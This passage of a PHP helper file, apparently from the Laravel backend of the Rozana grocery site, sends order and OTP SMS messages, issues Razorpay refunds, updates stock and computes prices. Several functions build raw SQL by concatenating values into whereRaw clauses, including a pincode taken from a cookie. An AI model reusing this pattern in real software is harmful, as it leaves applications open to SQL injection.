    if($order->payment_type=='razorpay' && !empty($order->wallet_amount))
    {
        $grand_total = $order->grand_total+$order->wallet_amount;
    }
    $trackurl = "https://www.rozana.in/track_your_order";
    $from = "RZANA";
    $tid  = "1707163506357734899"; 
    $msg = "Dear Customer, your order ".$order->code." for Rs ".$grand_total." will be delivered on ".date('D',strtotime($date))." ".date('d-m-Y',strtotime($date))." between 08:00 AM and 08:00 PM. Fresh Fruits, Dairy & Vegetables will be delivered the next day between 08:00 AM and 10 AM. You can track your order on ".$trackurl.". Thank You for placing an order from Rozana. We are eager to become a part of your daily lives! Team Rozana.";
    //"Dear Customer, your order ".$order->code." for Rs ".$grand_total." will be delivered on ".date('D',strtotime($date))." ".date('d-m-Y',strtotime($date))." between 08:00 AM and 08:00 PM. Fresh Fruits, Dairy & Vegetables will be delivered separately between 08:00 AM and 10 AM. You can track your order on ".$trackurl.". Thank You for placing an order from Rozana. We are eager to become a part of your daily lives! Team Rozana";
    //"Dear Customer, your order ".$order->code." for Rs ".$grand_total." will be delivered on ".date('D',strtotime($date))." ".date('d-m-Y',strtotime($date))." between 08:00 AM and 08:00 PM. Fresh Fruits & Vegetables will be delivered separately between 08:00 AM and 10 AM. You can track your order on ".$trackurl.". Thank You for placing an order from Rozana. We are eager to become a part of your daily lives! Team Rozana";
    if($to==$user_phone || !empty($order->guest_id)){
        mobilnxtSendSMS($to,$from,$msg,$tid);
    }else{
        mobilnxtSendSMS($to,$from,$msg,$tid);
        mobilnxtSendSMS($user_phone,$from,$msg,$tid);
    }
}
}

if(!function_exists('smsOnOrderCancel')){
    function smsOnOrderCancel($order_id)
    {
        $order = Order::findOrFail($order_id);
    
    
        $to = json_decode($order->shipping_address,true)['phone'];
        $user_phone = "";
        if(!empty($order->user_id))
        {
            $user_phone = User::where('id',$order->user_id)->first()->phone;
        }
        

        $from = "RZANA";
        // $tid  = "1707162574202475738"; 
        $tid  = "1707164405889459230"; 

        $grand_total = $order->grand_total;
        if($order->payment_type=='razorpay' && $order->payment_status=='paid' && !empty($order->wallet_amount))
        {
            $grand_total = $order->grand_total+$order->wallet_amount;
        }

        // $msg = "Your order ".$order->code." cancellation has been initiated. The refund of Rs ".$grand_total." will be credited to your account/wallet in 7-8 working days. Thank You, Team Rozana";

        $msg = "Your order ".$order->code." cancellation has been initiated. The refund of Rs ".$grand_total." will be credited to your account/wallet in 7-8 working days. Rozana";
        
        if($to==$user_phone || !empty($order->guest_id)){
            mobilnxtSendSMS($to,$from,$msg,$tid);
        }else{
            mobilnxtSendSMS($to,$from,$msg,$tid);
            mobilnxtSendSMS($user_phone,$from,$msg,$tid);
        }

    }
}

if(!function_exists('send_otp')){
 function send_otp($to,$otp){
    $from = "RZANA";
    $tid  = "1707162512040495140"; 
    $msg  = "Your OTP for rozana.in is ".$otp;
    return mobilnxtSendSMS($to,$from,$msg,$tid);
 }
}

if(!function_exists('changePasswordOtp')){
 function changePasswordOtp($to,$otp){
    $from = "RZANA";
    $tid  = "1707163247304653978"; 
    $msg  = "Your Rozana OTP to initiate password change is ".$otp.". It is valid for 10 minute. Do not share your OTP with anyone. Team Rozana";
    return mobilnxtSendSMS($to,$from,$msg,$tid);

    }

}

//OTP msg for LoginWithOTP
if(!function_exists('send_otp_login')){
 function send_otp_login($to,$otp){
    $from = "RZANA";
    $tid  = "1707163886130283431"; 
    $msg = "Dear Customer, Your OTP is ".$otp.". This is valid for 15 minutes and can be used only once. Thank you, Team Rozana";
    return mobilnxtSendSMS($to,$from,$msg,$tid);
 }
}


if(!function_exists('razorpayPartialRefund')){
    function razorpayPartialRefund($pay_id,$refund_amount){
        $response = array();
        $api = new Api(env('RAZOR_KEY'), env('RAZOR_SECRET'));
        $payment = $api->payment->fetch($pay_id);
        if($payment['status'] == "captured"){
            // $refund = $payment->refund();
            $refund = $payment->refund(array('amount' => $refund_amount*100));
            $response['status'] = 200;
            $response['refund_response'] = $refund;
        }else{
            $response['status'] = 404;
            $response['refund_response'] = $payment;
        }
        return $response;


    }

}

if(!function_exists('razorpayFullRefund')){
    function razorpayFullRefund($pay_id){
        $response = array();
        $api = new Api(env('RAZOR_KEY'), env('RAZOR_SECRET'));
        $payment = $api->payment->fetch($pay_id);
        if($payment['status'] == "captured" && $payment['status'] != "refunded"){
            $refund = $payment->refund();
            $response['status'] = 200;
            $response['refund_response'] = $refund;
        }else{
            $response['status'] = 404;
            $response['refund_response'] = $payment;
        }
        return $response;


    }

}

if(!function_exists('check_in_wishlist')){
    function check_in_wishlist($user_id,$product_id){
        return Wishlist::where(['user_id'=>$user_id,'product_id'=>$product_id])->first();
    }

}

if(!function_exists('updateStock')){
    function updateStock($order_id){
        $order = Order::find($order_id);
         $order_details = OrderDetail::where('order_id',$order_id)->get();
         $pincode = $order->shipping_pin_code;
         $shortId = \App\ShortingHub::whereRaw('JSON_CONTAINS(area_pincodes, \'["'.$pincode.'"]\')')->selectRaw('user_id as sorting_hub_id')->first('sorting_hub_id');
         $update = false;
         foreach($order_details as $key => $order_detail)
         {
            $stock = MappingProduct::where(['product_id'=>$order_detail->product_id,'sorting_hub_id'=>$shortId['sorting_hub_id']])->first();
           
            $new_stock = $stock->qty+$order_detail->quantity;
            $update = MappingProduct::where(['product_id'=>$order_detail->product_id,'sorting_hub_id'=>$shortId['sorting_hub_id']])->update(['qty'=>$new_stock]);
            
        }
        return $update;

    }

}

if (! function_exists('main_price_percent')) {
    function main_price_percent($id,$shortId="")
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        if(!empty($shortId)){
            $mappedProductPrice = \App\MappingProduct::where(['sorting_hub_id'=>$shortId['sorting_hub_id'],'product_id'=>$id])->first();
            if($mappedProductPrice['purchased_price'] !=0){
                $lowest_price = $mappedProductPrice['purchased_price'];
                $highest_price = $mappedProductPrice['selling_price'];
            }else{
                    $lowest_price = $product->unit_price;
                    $highest_price = $product->unit_price;
                    if ($product->variant_product) {
                        foreach ($product->stocks as $key => $stock) {
                            if($lowest_price > $stock->price){
                                $lowest_price = $stock->price;
                            }
                            if($highest_price < $stock->price){
                                $highest_price = $stock->price;
                            }
                        }
                    }

            }
        }else{
            $lowest_price = $product->unit_price;
            $highest_price = $product->unit_price;
            if ($product->variant_product) {
                foreach ($product->stocks as $key => $stock) {
                    if($lowest_price > $stock->price){
                        $lowest_price = $stock->price;
                    }
                    if($highest_price < $stock->price){
                        $highest_price = $stock->price;
                    }
                }
            }

        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if($lowest_price == $highest_price){
            return $lowest_price;
        }
        else{
            return $highest_price;
        }
    }
}

if(!function_exists('dofoCheck')){
    function dofoCheck($detail){
        if(!empty($detail)){
            $email = $detail['email'];
            $phone = $detail['phone'];
            $getDOFO = App\DOFO::where('email',$email)->where('status','=',1)->first();
            $response = '';
            if(!empty($getDOFO)){
                $response = 1;
            }else{
                $getDOFO = App\DOFO::where('phone',$phone)->where('status','=',1)->first();
                if(!empty($getDOFO)){
                    $response = 1;
                }else{
                    $response = 0;

                }
                
            }

        }else{
            $response = 0;
        }
        return $response;
    }

}

// if(!function_exists('bestSellingProduct')){
//     function bestSellingProduct($short_id){
//        if(!empty($short_id)){
//         $pincode = \App\ShortingHub::where('user_id',$short_id)->first();
//         $productid = array();
//         $getProductCount = DB::table('orders')
//                            ->leftjoin('order_details','orders.id','=','order_details.order_id')
//                            ->whereIn('orders.shipping_pin_code',json_decode($pincode['area_pincodes']))
//                            ->where('order_details.delivery_status','=','delivered')
//                            ->select('order_details.product_id',DB::raw('count(order_details.product_id) as selling_count'))
//                            ->groupBy('order_details.product_id')
//                            ->orderBy('selling_count', 'desc')
//                            ->limit('8')
//                            ->get();
//         foreach($getProductCount as $key=>$value){
//             $productid[$key] = $value->product_id;
//         }
//         return $productid;  
//        } 
       

//     }
// }

if(!function_exists('bestSellingProduct')){
    function bestSellingProduct($short_id){
        
       if(!empty($short_id)){
        $productIds = \App\BestSellingProduct::where('sorting_hub_id',$short_id)->first();
        $productIds = explode(',',$productIds->product_id);
       } else{
        $productIds = \App\BestSellingProduct::first();
        $productIds = explode(',',$productIds->product_id);
       }
    //    echo $productIds; die;
       return $productIds;
    }
}

if(!function_exists('flashDealProduct')){
    function flashDealProduct($short_id){
       if(!empty($short_id)){
        $pincode = \App\ShortingHub::where('user_id',$short_id)->first();
        $productId = \App\MappingProduct::where('sorting_hub_id',$short_id)->where('flash_deal',1)->pluck('product_id');
        

        return $productId;  
       } 
       

    }
}

if(!function_exists('sortinghubProductDetails')){
    function sortinghubProductDetails($type = "all"){
        $arr = array(
            "cid"=>[],
            "scid"=>[],
            "pid"=>[],
            "subscid"=>[]
        );
        if(!empty(Cookie::get('pincode'))){
            $pincode = Cookie::get('pincode');
            $distributorId = \App\Distributor::whereRaw('json_contains(pincode, \'["' . $pincode . '"]\')')->pluck('id')->all();
            if(!empty($distributorId)){
                $productIds = \App\MappingProduct::whereIn('distributor_id',$distributorId)->pluck('product_id')->all();
                $categoryIds = \App\Product::where('published', '1')->whereIn('id',$productIds)->distinct()->pluck('category_id')->all();
                $subcategoryIds = \App\Product::where('published', '1')->whereIn('id',$productIds)->distinct()->pluck('subcategory_id')->all();
                $SubsubcategoryIds = \App\Product::where('published', '1')->whereIn('id',$productIds)->distinct()->pluck('subsubcategory_id')->all();
                if($type == "all"){
                    $arr = [
                        "pid" => $productIds,
                        "cid" => $categoryIds,
                        "scid" => $subcategoryIds,
                        "subscid" => $SubsubcategoryIds
                    ];

                }elseif($type == "pid"){
                    $arr = [
                        "pid" => $productIds
                    ];
                }elseif($type == "cid"){
                    $arr = [
                        "cid" => $categoryIds,
                        "scid" => $subcategoryIds,
                        "subscid" => $SubsubcategoryIds
                    ];
                }
                
            }
         }
         return $arr;
    }
}

if(!function_exists('price')){
 function price($id,$shortId=""){

        $product = \App\Product::findOrFail($id);
        $price = $product->unit_price;
        $productStock = \App\ProductStock::where('product_id',$id)->first();
        if(!is_null($productStock)){
            $price = $productStock->price;

        }
        if(!empty($shortId)){

            
            if(!is_null($shortId)){
                $mappedProduct = \App\MappingProduct::where(['product_id'=>$id,'sorting_hub_id'=>$shortId['sorting_hub_id']])->first();
                if(!is_null($mappedProduct)){
                    if($mappedProduct->selling_price!=0){
                        $price = $mappedProduct->selling_price;
                    }
                }
            }
        }

        return $price;
    }
    }
    if(!function_exists('set_shipping')){
        function set_shipping(array $request)
    {
        $min_order_amount = (int)env("MIN_ORDER_AMOUNT");
        $free_shipping_amount = (int)env("FREE_SHIPPING_AMOUNT");
        if (Session::has('cart') && count(Session::get('cart')) > 0) {
            $cart = Session::get('cart', collect([]));
            $cart = $cart->map(function ($object, $key) use($request) {
                $product = \App\Product::find($object['id']);
                if ($product->added_by == 'admin') {
                    if ($request['shipping_type_admin'] == 'home_delivery' || $request['shipping_type_admin'] == 'Office_delivery') {
                        $object['shipping_type'] = 'home_delivery';
                    } else {
                        $object['shipping_type'] = 'pickup_point';
                        $object['pickup_point'] = $request->pickup_point_id_admin;
                    }
                } else {
                    if ($request['shipping_type_' . $product->user_id] == 'home_delivery') {
                        $object['shipping_type'] = 'home_delivery';
                    } else {
                        $object['shipping_type'] = 'pickup_point';
                        $object['pickup_point'] = $request['pickup_point_id_' . $product->user_id];
                    }
                }
                return $object;
            });

            Session::put('cart', $cart);
           
            $cart = $cart->map(function ($object, $key) use ($request) {
                $object['shipping'] = getShippingCost($key);
                return $object;
            });

            Session::put('cart', $cart);
            $subtotal = 0;
            $tax = 0;
            $shipping = 0;
            foreach (Session::get('cart') as $key => $cartItem) {
                $subtotal += $cartItem['price'] * $cartItem['quantity'];
                $tax += $cartItem['tax'] * $cartItem['quantity'];
                $shipping += $cartItem['shipping'] * $cartItem['quantity'];
            }
            if($subtotal>=$free_shipping_amount)
            {
                $shipping = 0;
            }
           
            $total = $subtotal + $tax + $shipping;

            if (Session::has('coupon_discount')) {
                $total -= Session::get('coupon_discount');
            }
        }
    }
	
    }

    if(!function_exists('complementary_products')){
        function complementary_products($shortId)
        {
            $productIds = [];
            if(!empty($shortId)){
                $productIds = \App\ComplementaryProduct::where('sorting_hub_id',$shortId['sorting_hub_id'])->pluck('product_id');
           
            }
            
            $products = \App\Product::find($productIds);
            return $products;
    
        }
    }
	
    if(!function_exists('calculatePrice')){
        function calculatePrice($product_id,$shortId = NULL,$self=0){
        $customer_off = 0;
        $customer_discount = "";
        $discount_type = '';
        $data = array();
        $peer_commission = 0;
        $master_commission = 0;
        $product = Product::findOrFail($product_id);
        
        $productstock = ProductStock::where('product_id', $product_id)->select('price')->first();
        if(!is_null($productstock)){
            $MRP = $productstock['price'];
        }else{
            $MRP = $product->unit_price;
        }
       
        if(!empty($shortId)){
            
            $productM = \App\MappingProduct::where(['sorting_hub_id'=>$shortId,'product_id'=>$product_id])->first();
            if(is_null($productM)){
                $selling_price = $MRP;
            }else{
                $selling_price = $productM['selling_price'];
                if($selling_price == 0){
                    $selling_price = $MRP;
                }else{
                    $MRP = $selling_price;
                }  
            } 
        }else{
            $selling_price = $MRP;
        }
        // $peercode = "Rozana7";
        if(isset($_SERVER['HTTP_PEER']) && !empty($_SERVER['HTTP_PEER'])){
            $peercode = $_SERVER['HTTP_PEER'];
        }else{
            // $peercode = "";
            $peercode = "ROZANA8";
        }
        if(!empty($peercode)){
            if(!empty($shortId)){
                $peer_discount_check = PeerSetting::where('product_id', '"'.$product_id.'"')->whereRaw('json_contains(sorting_hub_id, \'["' . $shortId. '"]\')')->latest('id')->first();
            }else{
                $peer_discount_check = PeerSetting::where('product_id', '"'.$product_id.'"')->latest('id')->first();
            }
        }


        if(!empty($peer_discount_check)){
            $customer_off =  $peer_discount_check->customer_off;
            $customer_discount = $peer_discount_check->customer_discount;
            $discount_type = $peer_discount_check->discount; 
            $peer_commission = $peer_discount_check->peer_commission;
            $master_commission = $peer_discount_check->master_commission;
           
            if(!empty($peer_discount_check->customer_off)){
              
                if($self=="1" || $self==1){
                   
                    // $MRP = $selling_price = $selling_price-($peer_commission+$master_commission);
                    $selling_price = $selling_price-($peer_commission+$master_commission+$peer_discount_check->customer_off);
                    // recalculate customer off
                    // $discount_percent = substr($peer_discount_check->customer_discount, 1, -1);
                    // $last_price = ($selling_price * $discount_percent)/100; 
                    // $selling_price = $selling_price - $last_price;
                    // $customer_off = round($last_price,2);
                    $customer_off =  $peer_commission+$master_commission+$peer_discount_check->customer_off;
                    
                }else{
                    $selling_price = $selling_price - $peer_discount_check->customer_off;
                }
                
               
               
            }
        }

        $data['MRP'] = $MRP;
        $data['selling_price'] = $selling_price;
        $data['customer_off'] = $customer_off;
        $data['customer_discount'] = $customer_discount;
        $data['discount_type'] = $discount_type;
        $data['peer_commission'] = ($self==0) ? $peer_commission: 0;
        $data['master_commission']= ($self==0) ? $master_commission: 0;
        return $data;
        }

    }

if(!function_exists('featured_categories')){
    function featured_categories($shortId){

    if(!empty($shortId))
    { 
        //Cache::forget('featured_categories'.$shortId['sorting_hub_id']);
        if(Cache::has('featured_categories'.$shortId['sorting_hub_id']))
        {

            $categories = Cache::get('featured_categories'.$shortId['sorting_hub_id']);
        }
        else{
            $categories = \App\Category::join('mapped_categories','categories.id','=','mapped_categories.category_id')
            ->where('mapped_categories.sorting_hub_id',$shortId['sorting_hub_id'])
            ->where('mapped_categories.status',1)
            ->where('categories.featured',1)
            ->where('categories.status',1)
            ->select('categories.*')
            ->orderBy('sorting','asc')
            ->get();
            Cache::put('featured_categories'.$shortId['sorting_hub_id'],$categories,3600);
            }
    }
    else{
        
        $categories = \App\Category::where('featured', 1)->orderBy('sorting','asc')->get();
    }
                         
        return $categories;
    }
}

if(!function_exists('getOrderCodes')){
    function getOrderCodes($orderIds = null)
    {
        $returnIds = array();
        $arrayIds = explode(",",$orderIds);
        $order = Order::whereIn('id',$arrayIds)->get('code');
        
        foreach($order as $k=>$v){
            array_push($returnIds,$v['code']);

        }
        return implode(",",$returnIds);

        

    }
}

//Delivery-slot SMS 02-02-2022
if(!function_exists('SMSonOrderPlacedWithSlot')){
function SMSonOrderPlacedWithSlot($order_id){
    $order = Order::findOrFail($order_id);
    
    $to = json_decode($order->shipping_address,true)['phone'];
    $user_phone = "";
    if(!empty($order->user_id))
    {
        $user_phone = User::where('id',$order->user_id)->first()->phone;
    }
    
    $grand_total = $order->grand_total;
    if($order->payment_type=='razorpay' && !empty($order->wallet_amount))
    {
        $grand_total = $order->grand_total+$order->wallet_amount;
    }

    $delivery_type = SubOrder::where('order_id',$order_id)->where('status',1)->pluck('delivery_type')->first();
    if($delivery_type == 'scheduled'){
        $schedule = SubOrder::where('order_id',$order_id)->where('status',1)->get();
        $count = count($schedule);
        if($count == 2){
            foreach($schedule as $value){
                $name = $value->delivery_name;
                if($name == 'fresh'){
                    $fresh_date = $value->delivery_date;
                    $fresh_time = $value->delivery_time;
                }else{
                    $grocery_date = $value->delivery_date;
                    $grocery_time = $value->delivery_time;
                } 
            }

            $tid  = "1707164371086998059";
            $msg = "Dear Customer order ".$order->code." Rs".$grand_total." Fruits&Veg will be delivered on ".date('D',strtotime($fresh_date))." ".date('d-m-Y',strtotime($fresh_date))." between ".$fresh_time." & Grocery on ".date('D',strtotime($grocery_date))." ".date('d-m-Y',strtotime($grocery_date))." between ".$grocery_time." Rozana"; 
        }else{
            foreach($schedule as $value){
                $delivery_date = $value->delivery_date;
                $delivery_time = $value->delivery_time;
            }
            $tid  = "1707164371058577229"; 
            $msg = "Dear Customer, your order ".$order->code." for Rs ".$grand_total." will be delivered on ".date('D',strtotime($delivery_date))." ".date('d-m-Y',strtotime($delivery_date))." between ".$delivery_time.". Team Rozana";

        }
    }else{
        $tid  = "1707164371035075444"; 
        $msg = "Dear Customer, your order ".$order->code." for Rs ".$grand_total." will be delivered within 24 Hrs. Team Rozana";

    }

    $from = "RZANA";
    
    if($to==$user_phone || !empty($order->guest_id)){
        mobilnxtSendSMS($to,$from,$msg,$tid);
    }else{
        mobilnxtSendSMS($to,$from,$msg,$tid);
        mobilnxtSendSMS($user_phone,$from,$msg,$tid);
    }
}
}


function orderStatusCount(int $order_status){
    $count = SubOrder::where('order_status',$order_status)->count();
    return $count;

}

    function dateFormatConvert($data){

        $date = explode('-',$data);
        $start = date('h:i A',strtotime($date[0]));
        $end = date('h:i A',strtotime($date[1]));
        $date = $start.' - '.$end;
        return $date;
    }

    function getShortinghub(int $pincode){
        $shortinghub = \App\ShortingHub::whereRaw('JSON_CONTAINS(area_pincodes, \'["'.$pincode.'"]\')')->first();
        return $shortinghub;

    }

    if(!function_exists('finalProduct')){
        function finalProduct($shortId,$product_id,$msg){
            $products = \App\Product::leftJoin('mapping_product','products.id','=','mapping_product.product_id')
            ->leftJoin('product_stocks','products.id','=','product_stocks.product_id')
                                ->where('products.published', 1)
                                ->where('mapping_product.sorting_hub_id', $shortId['sorting_hub_id'])
                                ->where('mapping_product.product_id',$product_id)
                                //->where('mapping_product.published',1)
                                ->select('products.*','mapping_product.qty','mapping_product.purchased_price','mapping_product.selling_price','mapping_product.flash_deal','mapping_product.top_product','mapping_product.sorting_hub_id','mapping_product.published as spublished','product_stocks.price','product_stocks.variant')
                                ->orderBy('mapping_product.top_product','DESC')
                                ->get();

            foreach($products as $key => $data){
                $peer_discount = \App\PeerSetting::where('product_id', '"'.$data->id.'"')->whereRaw('json_contains(sorting_hub_id, \'["' . $data->sorting_hub_id. '"]\')')->latest('id')->first(); 
                $discount_type = "percent";
                $discount_percentage = 0;
                $customer_off = 0;
                if(!is_null($peer_discount)){
                    $discount_type = substr($peer_discount->discount,1,-1);
                    $discount_percentage = substr($peer_discount->customer_discount,1,-1);
                    $customer_off = $peer_discount->customer_off;
                }
                \App\FinalProduct::updateOrCreate(
                    [
                       'product_id'   => $data->id,
                       'sorting_hub_id'=>$data->sorting_hub_id
                    ],
                    ['name'=>$data->name, 
                    'product_id'=>$data->id, 
                    'slug'=>$data->slug,
                    'category_id'=>$data->category_id,
                    'subcategory_id'=>$data->subcategory_id,
                    'subsubcategory_id'=>$data->subsubcategory_id,
                    'stock_price'=>(double)price($data->id,['sorting_hub_id'=>$data->sorting_hub_id]),
                    'base_price'=>round(peer_discounted_newbase_price($data->id,['sorting_hub_id'=>$data->sorting_hub_id]),2),
                    'variant'=>$data->variant,
                    'tags'=>$data->tags,
                    'json_tags'=>$data->json_tags,
                    'quantity'=>$data->qty,
                    'max_purchase_qty'=>$data->max_purchase_qty,
                    'discount_type'=>$discount_type,
                    'discount_percentage'=>$discount_percentage,
                    'customer_off'=>$customer_off,
                    'thumbnail_image'=>$data->thumbnail_img,
                    'photos'=>$data->photos,
                    'sorting_hub_id'=>$data->sorting_hub_id,
                    'flash_deal'=>$data->flash_deal,
                    'top_product'=>$data->top_product,
                    'published'=>$data->spublished,
                    'choice_options'=>$data->choice_options,
                    'unit'=>$data->unit,
                    'rating'=>$data->rating,
                    'sales'=>$data->num_of_sale,
                    'links' => json_encode([
                        'details' => route('products.show', $data->id),
                        'reviews' => route('api.reviews.index', $data->id),
                        'related' => route('products.related', $data->id)
                    ])
                    ]
                );
            }
    
            info("Observer ".$msg." successfully");
        }
    
    }

    if(!function_exists('isFreshInCategories')){
        function isFreshInCategories($categoryId){
            $categories = [18,26,34,33,38,39,40,43,46];
            if(in_array($categoryId,$categories)){
                return true;
            }
            return false;
        }
    }
    
    if(!function_exists('isFreshInSubCategories')){
        function isFreshInSubCategories($subcategoryId){
            $subcategories = [129,67];
            if(in_array($subcategoryId,$subcategories)){
                return true;
            }
            return false;
        }
    }

    if(!function_exists('updateFinalOrder')){
    function updateFinalOrder($order_id,$no_of_items,$grand_total,$total_discount){
        $update = \App\FinalOrder::where('order_id',$order_id)->update([
            'no_of_items'=>$no_of_items,
            'grand_total'=>$grand_total,
            'total_discount'=>$total_discount
        ]);
        return $update;
    }
    }

    if(!function_exists('updateSubOrder')){
    function updateSubOrder($no_of_items,$order_type,$order_id,$payable_amount,$total_discount){
        $update = \App\SubOrder::where(['order_id'=>$order_id,'delivery_name'=>$order_type])->update([
            'no_of_items'=>$no_of_items,
            'payable_amount'=>$payable_amount,
            'customer_discount'=>$total_discount
        ]);
        return $update;
    }
    }

    if(!function_exists('maxPurchaseQty')){
        function maxPurchaseQty($product_id,$shortId){
           $product = \App\MappingProduct::where('product_id',$product_id)->where('sorting_hub_id',$shortId)->first();
           $max_purchase_qty = 1;
           if(!is_null($product)){
                $max_purchase_qty = $product->max_purchaseprice;
           }
           return $max_purchase_qty;
        }
        }

        if(!function_exists('getdofoDetail')){
            function getdofoDetail($detail){
                if(!empty($detail)){
                    $email = $detail['email'];
                    $phone = $detail['phone'];
                    $getDOFO = App\DOFO::where('email',$email)->where('status','=',1)->first();
                    $response = '';
                    if(!empty($getDOFO)){
                        
                        $getDOFO->status = 0;
                        if($getDOFO->save()){
                            $response = 1;
                        }
                    }else{
                        $getDOFO = App\DOFO::where('phone',$phone)->where('status','=',1)->first();
                        if(!empty($getDOFO)){
                            $response = 1;
                            $getDOFO->status = 0;
                            if($getDOFO->save()){
                                $response = 1;
                            }
                        }else{
                            $response = 0;
        
                        }
                        
                    }
        
                }else{
                    $response = 0;
                }
                return $response;
            }
        
        }

?>
